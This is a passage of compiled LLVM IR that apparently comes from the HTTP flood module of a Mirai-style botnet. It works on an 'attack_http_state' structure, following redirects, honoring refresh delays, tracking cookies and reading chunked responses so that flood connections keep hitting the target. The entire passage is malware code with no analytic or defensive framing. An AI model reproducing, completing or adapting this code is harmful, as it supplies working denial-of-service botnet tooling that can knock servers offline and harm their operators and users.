  br i1 %622, label %.lr.ph623, label %.critedge564.loopexit

.critedge564.loopexit:                            ; preds = %618
  br label %.critedge564

.critedge564:                                     ; preds = %.critedge564.loopexit, %.preheader
  %623 = call i32 @util_strlen(i8* %.pre669) #7
  %624 = icmp slt i32 %623, 128
  br i1 %624, label %625, label %.loopexit

; <label>:625:                                    ; preds = %.critedge564
  %626 = load i32, i32* %562, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %627, i64 0
  %629 = call i32 @util_strcpy(i8* %628, i8* %.pre669) #7
  %630 = load i32, i32* %562, align 4
  %631 = add nsw i32 %630, 1
  store i32 %631, i32* %562, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph623
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %569, %._crit_edge620, %.critedge564, %625
  %632 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %633 = call i32 @util_stristr(i8* %.pre669, i32 %455, i8* %632) #7
  %634 = icmp eq i32 %633, -1
  br i1 %634, label %.critedge561.loopexit, label %.lr.ph625

.critedge561.loopexit:                            ; preds = %.loopexit, %.lr.ph625
  br label %.critedge561

.critedge561:                                     ; preds = %.critedge561.loopexit, %.preheader589
  %635 = call i8* @table_retrieve_val(i32 54, i32* null) #7
  %636 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %635) #7
  %637 = icmp eq i32 %636, -1
  br i1 %637, label %730, label %638

; <label>:638:                                    ; preds = %.critedge561
  %639 = call i8* @table_retrieve_val(i32 54, i32* null) #7
  %640 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %639) #7
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %641
  %643 = load i8, i8* %642, align 1
  %644 = icmp eq i8 %643, 32
  %645 = zext i1 %644 to i32
  %.565 = add nsw i32 %645, %640
  %646 = sext i32 %.565 to i64
  %647 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %646
  %648 = sub nsw i32 %455, %.565
  %649 = call i32 @util_memsearch(i8* %647, i32 %648, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %650 = icmp eq i32 %649, -1
  br i1 %650, label %730, label %651

; <label>:651:                                    ; preds = %638
  %652 = icmp sgt i32 %649, 1
  %653 = add nsw i32 %649, -2
  %.566 = select i1 %652, i32 %653, i32 %649
  %654 = add nsw i32 %.565, %.566
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %655
  store i8 0, i8* %656, align 1
  %657 = add nsw i32 %.566, 1
  %658 = call i32 @util_memsearch(i8* %647, i32 %657, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4) #7
  %659 = icmp eq i32 %658, 4
  br i1 %659, label %660, label %705

; <label>:660:                                    ; preds = %651
  %661 = getelementptr inbounds i8, i8* %647, i64 4
  %662 = load i8, i8* %661, align 1
  %663 = icmp eq i8 %662, 115
  %.567 = select i1 %663, i32 8, i32 7
  store i32 %.567, i32* %5, align 4
  %664 = zext i32 %.567 to i64
  %665 = getelementptr inbounds i8, i8* %647, i64 %664
  %666 = sub nsw i32 %657, %.567
  %667 = sext i32 %666 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %647, i8* %665, i64 %667, i32 1, i1 false)
  br label %668

; <label>:668:                                    ; preds = %673, %660
  %indvars.iv653 = phi i64 [ %indvars.iv.next654, %673 ], [ 0, %660 ]
  %669 = getelementptr inbounds i8, i8* %647, i64 %indvars.iv653
  %670 = load i8, i8* %669, align 1
  switch i8 %670, label %673 [
    i8 0, label %.loopexit588
    i8 47, label %671
  ]

; <label>:671:                                    ; preds = %668
  %672 = trunc i64 %indvars.iv653 to i32
  store i32 %672, i32* %5, align 4
  store i8 0, i8* %669, align 1
  br label %675

; <label>:673:                                    ; preds = %668
  %indvars.iv.next654 = add nuw i64 %indvars.iv653, 1
  br label %668

.loopexit588:                                     ; preds = %668
  %674 = trunc i64 %indvars.iv653 to i32
  store i32 %674, i32* %5, align 4
  br label %675

; <label>:675:                                    ; preds = %.loopexit588, %671
  %676 = call i32 @util_strlen(i8* nonnull %647) #7
  %677 = icmp sgt i32 %676, 0
  br i1 %677, label %678, label %684

; <label>:678:                                    ; preds = %675
  %679 = call i32 @util_strlen(i8* nonnull %647) #7
  %680 = icmp slt i32 %679, 128
  br i1 %680, label %681, label %684

; <label>:681:                                    ; preds = %678
  %682 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %683 = call i32 @util_strcpy(i8* %682, i8* nonnull %647) #7
  br label %684

; <label>:684:                                    ; preds = %681, %678, %675
  %685 = load i32, i32* %5, align 4
  %686 = add nsw i32 %685, 1
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds i8, i8* %647, i64 %687
  %689 = call i32 @util_strlen(i8* %688) #7
  %690 = icmp slt i32 %689, 256
  br i1 %690, label %691, label %729

; <label>:691:                                    ; preds = %684
  %692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %692, i32 255) #7
  %693 = load i32, i32* %5, align 4
  %694 = add nsw i32 %693, 1
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds i8, i8* %647, i64 %695
  %697 = call i32 @util_strlen(i8* %696) #7
  %698 = icmp sgt i32 %697, 0
  br i1 %698, label %699, label %729

; <label>:699:                                    ; preds = %691
  %700 = load i32, i32* %5, align 4
  %701 = add nsw i32 %700, 1
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds i8, i8* %647, i64 %702
  %704 = call i32 @util_strcpy(i8* %692, i8* %703) #7
  br label %729

; <label>:705:                                    ; preds = %651
  %706 = load i8, i8* %647, align 1
  %707 = icmp eq i8 %706, 47
  br i1 %707, label %708, label %729

; <label>:708:                                    ; preds = %705
  %709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %709, i32 255) #7
  %710 = load i32, i32* %5, align 4
  %711 = add nsw i32 %710, 1
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds i8, i8* %647, i64 %712
  %714 = call i32 @util_strlen(i8* %713) #7
  %715 = icmp sgt i32 %714, 0
  br i1 %715, label %716, label %729

; <label>:716:                                    ; preds = %708
  %717 = load i32, i32* %5, align 4
  %718 = add nsw i32 %717, 1
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds i8, i8* %647, i64 %719
  %721 = call i32 @util_strlen(i8* %720) #7
  %722 = icmp slt i32 %721, 256
  br i1 %722, label %723, label %729

; <label>:723:                                    ; preds = %716
  %724 = load i32, i32* %5, align 4
  %725 = add nsw i32 %724, 1
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds i8, i8* %647, i64 %726
  %728 = call i32 @util_strcpy(i8* %709, i8* %727) #7
  br label %729

; <label>:729:                                    ; preds = %705, %723, %716, %708, %684, %699, %691
  store i8 1, i8* %442, align 4
  br label %.loopexit591

; <label>:730:                                    ; preds = %638, %.critedge561
  %731 = call i8* @table_retrieve_val(i32 53, i32* null) #7
  %732 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %731) #7
  %733 = icmp eq i32 %732, -1
  br i1 %733, label %893, label %734

; <label>:734:                                    ; preds = %730
  %735 = call i8* @table_retrieve_val(i32 53, i32* null) #7
  %736 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %735) #7
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %737
  %739 = load i8, i8* %738, align 1
  %740 = icmp eq i8 %739, 32
  %741 = zext i1 %740 to i32
  %.568 = add nsw i32 %741, %736
  %742 = sext i32 %.568 to i64
  %743 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %742
  %744 = sub nsw i32 %455, %.568
  %745 = call i32 @util_memsearch(i8* %743, i32 %744, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %746 = icmp eq i32 %745, -1
  br i1 %746, label %893, label %747

; <label>:747:                                    ; preds = %734
  %748 = icmp sgt i32 %745, 1
  %749 = add nsw i32 %745, -2
  %.569 = select i1 %748, i32 %749, i32 %745
  %750 = add nsw i32 %.568, %.569
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %751
  store i8 0, i8* %752, align 1
  br label %753

; <label>:753:                                    ; preds = %753, %747
  %indvars.iv655 = phi i64 [ %indvars.iv.next656, %753 ], [ 0, %747 ]
  %754 = getelementptr inbounds i8, i8* %743, i64 %indvars.iv655
  %755 = load i8, i8* %754, align 1
  %.off585 = add i8 %755, -48
  %756 = icmp ult i8 %.off585, 10
  %indvars.iv.next656 = add nuw i64 %indvars.iv655, 1
  br i1 %756, label %753, label %.critedge

.critedge:                                        ; preds = %753
  %757 = add nsw i32 %.569, 1
  %758 = trunc i64 %indvars.iv655 to i32
  store i32 %758, i32* %5, align 4
  %759 = icmp eq i8 %755, 0
  br i1 %759, label %893, label %760

; <label>:760:                                    ; preds = %.critedge
  store i8 0, i8* %754, align 1
  %761 = add nsw i32 %758, 1
  store i32 %761, i32* %5, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds i8, i8* %743, i64 %762
  %764 = load i8, i8* %763, align 1
  %765 = icmp eq i8 %764, 32
  br i1 %765, label %766, label %768

; <label>:766:                                    ; preds = %760
  %767 = add nsw i32 %758, 2
  store i32 %767, i32* %5, align 4
  br label %768

; <label>:768:                                    ; preds = %766, %760
  %769 = phi i32 [ %767, %766 ], [ %761, %760 ]
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i8, i8* %743, i64 %770
  %772 = call i32 @util_strlen(i8* %771) #7
  %773 = call i32 @util_stristr(i8* %771, i32 %772, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #7
  %774 = icmp eq i32 %773, -1
  %.pre665 = load i32, i32* %5, align 4
  br i1 %774, label %._crit_edge664, label %775

; <label>:775:                                    ; preds = %768
  %776 = sext i32 %.pre665 to i64
  %777 = getelementptr inbounds i8, i8* %743, i64 %776
  %778 = call i32 @util_strlen(i8* %777) #7
  %779 = call i32 @util_stristr(i8* %777, i32 %778, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #7
  %780 = load i32, i32* %5, align 4
  %781 = add nsw i32 %780, %779
  store i32 %781, i32* %5, align 4
  br label %._crit_edge664

._crit_edge664:                                   ; preds = %768, %775
  %782 = phi i32 [ %781, %775 ], [ %.pre665, %768 ]
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds i8, i8* %743, i64 %783
  %785 = load i8, i8* %784, align 1
  %786 = icmp eq i8 %785, 34
  br i1 %786, label %787, label %805

; <label>:787:                                    ; preds = %._crit_edge664
  %788 = add nsw i32 %782, 1
  store i32 %788, i32* %5, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds i8, i8* %743, i64 %789
  %791 = call i32 @util_strlen(i8* %790) #7
  %792 = add nsw i32 %791, -1
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds i8, i8* %790, i64 %793
  %795 = load i8, i8* %794, align 1
  %796 = icmp eq i8 %795, 34
  br i1 %796, label %797, label %805

; <label>:797:                                    ; preds = %787
  %798 = load i32, i32* %5, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds i8, i8* %743, i64 %799
  %801 = call i32 @util_strlen(i8* %800) #7
  %802 = add nsw i32 %801, -1
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds i8, i8* %800, i64 %803
  store i8 0, i8* %804, align 1
  br label %805

; <label>:805:                                    ; preds = %787, %797, %._crit_edge664
  %806 = call i32 @util_atoi(i8* nonnull %743, i32 10) #7
  %807 = add i32 %806, %404
  %808 = zext i32 %807 to i64
  %.off = add i32 %806, -1
  %809 = icmp ult i32 %.off, 9
  br i1 %809, label %.lr.ph629.split.us.preheader, label %.critedge12

.lr.ph629.split.us.preheader:                     ; preds = %805
  %810 = call i64 @time(i64* null) #7
  %811 = icmp sgt i64 %808, %810
  br i1 %811, label %.lr.ph629.split.us.preheader706, label %.critedge12

.lr.ph629.split.us.preheader706:                  ; preds = %.lr.ph629.split.us.preheader
  br label %.lr.ph629.split.us

.lr.ph629.split.us:                               ; preds = %.lr.ph629.split.us.preheader706, %.lr.ph629.split.us
  %812 = call i32 @sleep(i32 1) #7
  %813 = call i64 @time(i64* null) #7
  %814 = icmp sgt i64 %808, %813
  br i1 %814, label %.lr.ph629.split.us, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph629.split.us
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph629.split.us.preheader, %805
  %815 = load i32, i32* %5, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds i8, i8* %743, i64 %816
  %818 = call i32 @util_strlen(i8* %817) #7
  %819 = call i32 @util_stristr(i8* %817, i32 %818, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #7
  %820 = icmp eq i32 %819, 4
  br i1 %820, label %821, label %866

; <label>:821:                                    ; preds = %.critedge12
  %822 = getelementptr inbounds i8, i8* %817, i64 4
  %823 = load i8, i8* %822, align 1
  %824 = icmp eq i8 %823, 115
  %.572 = select i1 %824, i32 8, i32 7
  store i32 %.572, i32* %5, align 4
  %825 = zext i32 %.572 to i64
  %826 = getelementptr inbounds i8, i8* %817, i64 %825
  %827 = sub i32 %757, %.572
  %828 = sext i32 %827 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %817, i8* %826, i64 %828, i32 1, i1 false)
  br label %829

; <label>:829:                                    ; preds = %834, %821
  %indvars.iv657 = phi i64 [ %indvars.iv.next658, %834 ], [ 0, %821 ]
  %830 = getelementptr inbounds i8, i8* %817, i64 %indvars.iv657
  %831 = load i8, i8* %830, align 1
  switch i8 %831, label %834 [
    i8 0, label %.loopexit587
    i8 47, label %832
  ]

; <label>:832:                                    ; preds = %829
  %833 = trunc i64 %indvars.iv657 to i32
  store i32 %833, i32* %5, align 4
  store i8 0, i8* %830, align 1
  br label %836

; <label>:834:                                    ; preds = %829
  %indvars.iv.next658 = add nuw i64 %indvars.iv657, 1
  br label %829

.loopexit587:                                     ; preds = %829
  %835 = trunc i64 %indvars.iv657 to i32
  store i32 %835, i32* %5, align 4
  br label %836

; <label>:836:                                    ; preds = %.loopexit587, %832
  %837 = call i32 @util_strlen(i8* nonnull %817) #7
  %838 = icmp sgt i32 %837, 0
  br i1 %838, label %839, label %845

; <label>:839:                                    ; preds = %836
  %840 = call i32 @util_strlen(i8* nonnull %817) #7
  %841 = icmp slt i32 %840, 128
  br i1 %841, label %842, label %845

; <label>:842:                                    ; preds = %839
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %844 = call i32 @util_strcpy(i8* %843, i8* nonnull %817) #7
  br label %845

; <label>:845:                                    ; preds = %842, %839, %836
  %846 = load i32, i32* %5, align 4
  %847 = add nsw i32 %846, 1
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds i8, i8* %817, i64 %848
  %850 = call i32 @util_strlen(i8* %849) #7
  %851 = icmp slt i32 %850, 256
  br i1 %851, label %852, label %890

; <label>:852:                                    ; preds = %845
  %853 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %853, i32 255) #7
  %854 = load i32, i32* %5, align 4
  %855 = add nsw i32 %854, 1
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds i8, i8* %817, i64 %856
  %858 = call i32 @util_strlen(i8* %857) #7
  %859 = icmp sgt i32 %858, 0
  br i1 %859, label %860, label %890

; <label>:860:                                    ; preds = %852
  %861 = load i32, i32* %5, align 4
  %862 = add nsw i32 %861, 1
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds i8, i8* %817, i64 %863
  %865 = call i32 @util_strcpy(i8* %853, i8* %864) #7
  br label %890

; <label>:866:                                    ; preds = %.critedge12
  %867 = load i8, i8* %817, align 1
  %868 = icmp eq i8 %867, 47
  br i1 %868, label %869, label %890

; <label>:869:                                    ; preds = %866
  %870 = load i32, i32* %5, align 4
  %871 = add nsw i32 %870, 1
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds i8, i8* %817, i64 %872
  %874 = call i32 @util_strlen(i8* %873) #7
  %875 = icmp slt i32 %874, 256
  br i1 %875, label %876, label %890

; <label>:876:                                    ; preds = %869
  %877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %877, i32 255) #7
  %878 = load i32, i32* %5, align 4
  %879 = add nsw i32 %878, 1
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds i8, i8* %817, i64 %880
  %882 = call i32 @util_strlen(i8* %881) #7
  %883 = icmp sgt i32 %882, 0
  br i1 %883, label %884, label %890

; <label>:884:                                    ; preds = %876
  %885 = load i32, i32* %5, align 4
  %886 = add nsw i32 %885, 1
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds i8, i8* %817, i64 %887
  %889 = call i32 @util_strcpy(i8* %877, i8* %888) #7
  br label %890

; <label>:890:                                    ; preds = %866, %876, %884, %869, %845, %860, %852
  %891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %892 = bitcast i8* %891 to i32*
  store i32 5522759, i32* %892, align 1
  store i8 10, i8* %442, align 4
  br label %.loopexit591

; <label>:893:                                    ; preds = %.critedge, %734, %730
  %894 = call i32 @util_memsearch(i8* nonnull %21, i32 %455, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %896 = call signext i8 @util_strcmp(i8* %895, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #7
  %897 = icmp eq i8 %896, 0
  br i1 %897, label %898, label %903

; <label>:898:                                    ; preds = %893
  %899 = call signext i8 @util_strcmp(i8* %895, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #7
  %900 = icmp eq i8 %899, 0
  br i1 %900, label %901, label %903

; <label>:901:                                    ; preds = %898
  %902 = icmp sgt i32 %455, %894
  %.sink13 = select i1 %902, i8 10, i8 1
  br label %903

; <label>:903:                                    ; preds = %893, %898, %901
  %storemerge542 = phi i8 [ %.sink13, %901 ], [ 7, %898 ], [ 7, %893 ]
  store i8 %storemerge542, i8* %442, align 4
  %904 = load i32, i32* %406, align 4
  %905 = sext i32 %894 to i64
  %906 = call i64 @recv(i32 %904, i8* nonnull %21, i64 %905, i32 16384) #7
  br label %.loopexit591

; <label>:907:                                    ; preds = %.preheader590, %.backedge
  %908 = load i32, i32* %444, align 4
  %909 = icmp eq i32 %908, 1024
  br i1 %909, label %910, label %911

; <label>:910:                                    ; preds = %907
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %445, i8* nonnull %446, i64 960, i32 1, i1 false)
  store i32 960, i32* %444, align 4
  br label %911

; <label>:911:                                    ; preds = %910, %907
  %912 = tail call i32* @__errno_location() #8
  store i32 0, i32* %912, align 4
  %913 = load i32, i32* %406, align 4
  %914 = load i32, i32* %444, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %915
  %917 = sub nsw i32 1024, %914
  %918 = sext i32 %917 to i64
  %919 = call i64 @recv(i32 %913, i8* %916, i64 %918, i32 16384) #7
  %920 = trunc i64 %919 to i32
  switch i32 %920, label %926 [
    i32 0, label %.thread581
    i32 -1, label %921
  ]

.thread581:                                       ; preds = %911
  store i32 104, i32* %912, align 4
  br label %923

; <label>:921:                                    ; preds = %911
  %.pr580 = load i32, i32* %912, align 4
  %922 = icmp eq i32 %.pr580, 11
  br i1 %922, label %.loopexit591, label %923

; <label>:923:                                    ; preds = %.thread581, %921
  %924 = load i32, i32* %406, align 4
  %925 = call i32 @close(i32 %924) #7
  store i32 -1, i32* %406, align 4
  store i8 0, i8* %442, align 4
  br label %.loopexit591

; <label>:926:                                    ; preds = %911
  %927 = load i32, i32* %444, align 4
  %928 = add nsw i32 %927, %920
  store i32 %928, i32* %444, align 4
  store i32 %404, i32* %447, align 4
  br label %929

; <label>:929:                                    ; preds = %1029, %926
  %930 = phi i32 [ %1036, %1029 ], [ %928, %926 ]
  %931 = load i32, i32* %448, align 4
  %932 = icmp sgt i32 %931, 0
  br i1 %932, label %933, label %994

; <label>:933:                                    ; preds = %929
  %934 = icmp sgt i32 %931, %930
  %.sink14 = select i1 %934, i32* %444, i32* %448
  %935 = load i32, i32* %.sink14, align 4
  %936 = sub nsw i32 %931, %935
  store i32 %936, i32* %448, align 4
  %937 = load i32, i32* %449, align 4
  %938 = icmp eq i32 %937, 1
  br i1 %938, label %939, label %994

; <label>:939:                                    ; preds = %933
  %940 = call i8* @table_retrieve_val(i32 52, i32* null) #7
  %941 = call i32 @util_memsearch(i8* nonnull %445, i32 %930, i8* %940, i32 11) #7
  %942 = icmp eq i32 %941, -1
  br i1 %942, label %thread-pre-split573, label %943

; <label>:943:                                    ; preds = %939
  %944 = load i32, i32* %444, align 4
  %945 = call i8* @table_retrieve_val(i32 52, i32* null) #7
  %946 = call i32 @util_memsearch(i8* nonnull %445, i32 %944, i8* %945, i32 11) #7
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %947
  %949 = load i32, i32* %444, align 4
  %950 = sub nsw i32 %949, %946
  %951 = call i32 @util_memsearch(i8* %948, i32 %950, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i64 0, i64 0), i32 1) #7
  %952 = add i32 %946, -1
  %953 = add i32 %952, %951
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %954
  store i8 0, i8* %955, align 1
  %956 = load i32, i32* %451, align 4
  %957 = icmp slt i32 %956, 5
  br i1 %957, label %958, label %993

; <label>:958:                                    ; preds = %943
  %959 = call i32 @util_strlen(i8* %948) #7
  %960 = icmp slt i32 %959, 128
  br i1 %960, label %961, label %993

; <label>:961:                                    ; preds = %958
  %962 = load i32, i32* %451, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %963, i64 0
  %965 = call i32 @util_strcpy(i8* %964, i8* %948) #7
  %966 = load i32, i32* %451, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %967, i64 0
  %969 = call i32 @util_strlen(i8* %968) #7
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %967, i64 %970
  %972 = call i32 @util_strcpy(i8* %971, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i64 0, i64 0)) #7
  %973 = add i32 %946, 3
  %974 = add i32 %973, %951
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %975
  %977 = load i32, i32* %444, align 4
  %978 = sub nsw i32 %977, %974
  %979 = call i32 @util_memsearch(i8* %976, i32 %978, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i64 0, i64 0), i32 1) #7
  %980 = add i32 %974, -1
  %981 = add i32 %980, %979
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %982
  store i8 0, i8* %983, align 1
  %984 = load i32, i32* %451, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %985, i64 0
  %987 = call i32 @util_strlen(i8* %986) #7
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %985, i64 %988
  %990 = call i32 @util_strcpy(i8* %989, i8* %976) #7
  %991 = load i32, i32* %451, align 4
  %992 = add nsw i32 %991, 1
  store i32 %992, i32* %451, align 4
  br label %993

; <label>:993:                                    ; preds = %961, %958, %943
  store i32 -1, i32* %448, align 4
  store i8 10, i8* %442, align 4
  br label %.loopexit591

thread-pre-split573:                              ; preds = %939
  %.pr574 = load i32, i32* %448, align 4
  br label %994

; <label>:994:                                    ; preds = %thread-pre-split573, %933, %929
  %995 = phi i32 [ %.pr574, %thread-pre-split573 ], [ %936, %933 ], [ %931, %929 ]
  %.0522 = phi i32 [ %935, %thread-pre-split573 ], [ %935, %933 ], [ 0, %929 ]
  %996 = icmp eq i32 %995, 0
  br i1 %996, label %997, label %1027

; <label>:997:                                    ; preds = %994
  %998 = load i32, i32* %450, align 4
  %999 = icmp eq i32 %998, 1
  %1000 = load i32, i32* %444, align 4
  br i1 %999, label %1001, label %1022

; <label>:1001:                                   ; preds = %997
  %1002 = call i32 @util_memsearch(i8* nonnull %445, i32 %1000, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %1003 = icmp eq i32 %1002, -1
  br i1 %1003, label %1027, label %1004

; <label>:1004:                                   ; preds = %1001
  %1005 = load i32, i32* %444, align 4
  %1006 = call i32 @util_memsearch(i8* nonnull %445, i32 %1005, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %1007 = add nsw i32 %1006, -2
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1008
  store i8 0, i8* %1009, align 1
  %1010 = call i32 @util_memsearch(i8* nonnull %445, i32 %1006, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i64 0, i64 0), i32 1) #7
  %1011 = icmp eq i32 %1010, -1
  br i1 %1011, label %1016, label %1012

; <label>:1012:                                   ; preds = %1004
  %1013 = call i32 @util_memsearch(i8* nonnull %445, i32 %1006, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i64 0, i64 0), i32 1) #7
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1014
  store i8 0, i8* %1015, align 1
  br label %1016

; <label>:1016:                                   ; preds = %1004, %1012
  %1017 = call i32 @util_atoi(i8* nonnull %445, i32 16) #7
  %1018 = icmp eq i32 %1017, 0
  br i1 %1018, label %1019, label %1020

; <label>:1019:                                   ; preds = %1016
  store i8 1, i8* %442, align 4
  br label %.loopexit591

; <label>:1020:                                   ; preds = %1016
  %1021 = add nsw i32 %1017, 2
  store i32 %1021, i32* %448, align 4
  br label %1027

; <label>:1022:                                   ; preds = %997
  %1023 = sub nsw i32 %1000, %.0522
  store i32 %1023, i32* %448, align 4
  %1024 = icmp eq i32 %1023, 0
  br i1 %1024, label %1025, label %1027

; <label>:1025:                                   ; preds = %1022
  store i8 1, i8* %442, align 4
  br label %.loopexit591

.backedge:                                        ; preds = %1027, %1029
  %.pr = load i8, i8* %442, align 4
  %1026 = icmp eq i8 %.pr, 7
  br i1 %1026, label %907, label %.loopexit591.loopexit

; <label>:1027:                                   ; preds = %1001, %1020, %1022, %994
  %.1523 = phi i32 [ %1006, %1020 ], [ %.0522, %1001 ], [ %.0522, %1022 ], [ %.0522, %994 ]
  %1028 = icmp eq i32 %.1523, 0
  br i1 %1028, label %.backedge, label %1029

; <label>:1029:                                   ; preds = %1027
  %1030 = load i32, i32* %444, align 4
  %1031 = sub nsw i32 %1030, %.1523
  store i32 %1031, i32* %444, align 4
  %1032 = sext i32 %.1523 to i64
  %1033 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1032
  %1034 = sext i32 %1031 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %445, i8* %1033, i64 %1034, i32 1, i1 false)
  %1035 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1034
  store i8 0, i8* %1035, align 1
  %1036 = load i32, i32* %444, align 4
  %1037 = icmp eq i32 %1036, 0
  br i1 %1037, label %.backedge, label %929

.preheader592:                                    ; preds = %.preheader592.preheader, %.preheader592
  %1038 = tail call i32* @__errno_location() #8
  store i32 0, i32* %1038, align 4
  %1039 = load i32, i32* %406, align 4
  %1040 = call i64 @recv(i32 %1039, i8* nonnull %21, i64 10240, i32 16384) #7
  %1041 = trunc i64 %1040 to i32
  switch i32 %1041, label %.preheader592 [
    i32 0, label %.thread584
    i32 -1, label %1042
